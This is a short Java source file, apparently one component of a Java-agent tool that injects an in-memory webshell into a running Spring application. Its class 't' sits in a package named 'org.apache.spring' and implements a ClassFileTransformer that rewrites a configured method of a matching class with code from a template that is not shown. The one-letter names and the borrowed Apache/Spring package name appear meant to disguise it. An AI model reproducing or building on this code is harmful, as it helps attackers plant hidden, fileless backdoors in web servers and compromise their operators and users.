package org.apache.spring;


import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class t implements ClassFileTransformer {
    public static final String TransformedClassName = c.SpringMemTransformerConfig.TransformedClassName;
    public static final String TransformedEqualName = c.SpringMemTransformerConfig.TransformedEqualName;
    public static final String TransformedMethodName = c.SpringMemTransformerConfig.TransformedMethodName;

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals(TransformedEqualName)) {
            try {
                return u.ChangeSource(classBeingRedefined, TransformedClassName, TransformedMethodName, c.TemplatesConfig.StartTransformer);
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }
        return null;
    }
}
